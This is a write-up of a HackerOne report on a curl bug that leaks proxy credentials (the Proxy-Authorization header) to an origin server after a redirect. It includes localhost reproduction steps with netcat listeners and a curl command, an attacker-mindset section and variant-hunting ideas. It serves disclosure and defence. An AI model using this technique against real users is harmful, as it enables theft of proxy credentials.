# Proxy-Authorization Header Leaked to Origin Server on Redirect from Proxied to Direct Connection

## Metadata
- **Source:** HackerOne
- **Report:** 3480713 | https://hackerone.com/reports/3480713
- **Submitted:** 2025-12-28
- **Reporter:** yupiy
- **Program:** curl
- **Bounty:** Not specified in writeup
- **Severity:** High
- **Vuln:** Credential Exposure, Information Disclosure, HTTP Header Leakage, Improper Header Handling
- **CVEs:** None
- **Category:** uncategorised

## Summary
curl leaks the Proxy-Authorization header to origin servers when following HTTP redirects that transition from proxied connections to direct connections (via --noproxy or proxy bypass). The Proxy-Authorization header is hop-by-hop and should never be forwarded to origin servers, yet curl fails to strip it during the connection type transition.

## Attack scenario
1. Attacker sets up a malicious origin server and proxies that redirect requests to it
2. Victim user issues a curl command with proxy authentication credentials and a redirect-enabling option like --noproxy
3. curl connects to the proxy and sends the Proxy-Authorization header for authentication
4. Proxy responds with a 302 redirect pointing to attacker's origin server (matching --noproxy rules)
5. curl follows the redirect and connects directly to origin server without proxy
6. curl erroneously includes the Proxy-Authorization header in the direct request, exposing proxy credentials to the attacker

## Root cause
curl's header handling logic fails to distinguish between hop-by-hop headers (like Proxy-Authorization) and end-to-end headers during redirect processing. When transitioning from a proxied connection to a direct connection, curl does not strip proxy-specific headers that should only exist for the proxy leg of the connection.

## Attacker mindset
An attacker controlling an origin server or performing a man-in-the-middle attack can intercept redirects to capture proxy credentials. By crafting responses that redirect proxied requests to attacker-controlled servers matching noproxy patterns, they can harvest authentication credentials intended only for the proxy.

## Defensive takeaways
- Always strip hop-by-hop headers (Proxy-Authorization, Proxy-Connection, etc.) when transitioning from proxied to direct connections
- Implement explicit header classification distinguishing between proxy-specific and origin-server headers
- Validate header preservation logic during redirect handling, especially across connection type changes
- Add security tests covering redirect scenarios with proxy authentication
- Consider deprecating implicit header carry-over; use allowlist approach for headers to forward
- Audit HTTP client libraries for similar header leakage patterns in redirect handling

## Variant hunting
Test other HTTP clients (wget, httpie, requests library) for identical proxy-auth header leakage on redirects
Check if other hop-by-hop headers (Connection, Keep-Alive) are similarly leaked during transitions
Investigate behavior with reverse proxies and X-Forwarded-* headers during redirects
Test HTTPS to HTTP downgrade redirects combined with proxy authentication
Examine credential leakage in SOCKS proxy scenarios
Check if proxy credentials leak when switching between different proxy types (HTTP to SOCKS)
Test redirect chains crossing proxy boundaries multiple times

## MITRE ATT&CK
- T1187
- T1040
- T1041

## Notes
This vulnerability is particularly dangerous because proxy credentials are often service-account credentials with broad network access. The bug violates RFC 7230 which explicitly defines Proxy-Authorization as a hop-by-hop header. The --noproxy feature makes this exploitable since attackers can craft redirect locations matching noproxy patterns to trigger direct connections where headers get leaked.

## Full report
<details><summary>Expand</summary>

## Summary

curl leaks the Proxy-Authorization header to the origin server after following an HTTP redirect that transitions from a proxied connection to a direct connection (e.g. when using --noproxy or when proxy is bypassed after redirect). This causes proxy credentials (which are hop-by-hop) to be sent to unintended servers.

## Affected version

Tested with:
curl 8.17.0 on Linux x86_64

curl -V:
[PASTE curl -V OUTPUT HERE]

## Steps To Reproduce

1. Start a fake origin server:

   nc -l -p 8080

2. Start a fake proxy that redirects to the origin:

   printf "HTTP/1.1 302 Found\r\nLocation: http://127.0.0.1:8080/\r\nContent-Length: 0\r\n\r\n" | nc -l -p 3128

3. Run curl:

   curl -v -L \
     -x http://127.0.0.1:3128 \
     -H "Proxy-Authorization: Basic RAHASIA_NEGARA_BOCOR" \
     --noproxy 127.0.0.1 \
     http://example.com

4. Observe the request received by the origin server.

## Observed Behavior

### curl verbose output:

*   Trying 127.0.0.1:3128...
* Established connection to 127.0.0.1 (127.0.0.1 port 3128)
> GET http://example.com/ HTTP/1.1
> Host: example.com
> User-Agent: curl/8.17.0
> Accept: */*
> Proxy-Connection: Keep-Alive
> Proxy-Authorization: Basic RAHASIA_NEGARA_BOCOR
>
< HTTP/1.1 302 Found
< Location: http://127.0.0.1:8080/
< Content-Length: 0
* Issue another request to this URL: 'http://127.0.0.1:8080/'
*   Trying 127.0.0.1:8080...
* Established connection to 127.0.0.1 (127.0.0.1 port 8080)
> GET / HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/8.17.0
> Accept: */*
> Proxy-Authorization: Basic RAHASIA_NEGARA_BOCOR

### Origin server output (nc -l -p 8080):

GET / HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: curl/8.17.0
Accept: */*
Proxy-Authorization: Basic RAHASIA_NEGARA_BOCOR

## Expected Behavior

The Proxy-Authorization header must never be forwarded to origin servers and should be stripped when the request is sent directly instead of via a proxy.


## Supporting Material

Attached:
- curl verbose output showing header leakage
- Origin server log showing leaked Proxy-Authorization header

## Impact

## Impact

An attacker-controlled origin server can steal proxy credentials if a proxied request is redirected to a direct connection. This violates HTTP semantics (Proxy-Authorization is hop-by-hop) and can result in credential compromise and unauthorized proxy access.

</details>

---
*Analysed by Claude on 2026-05-24*
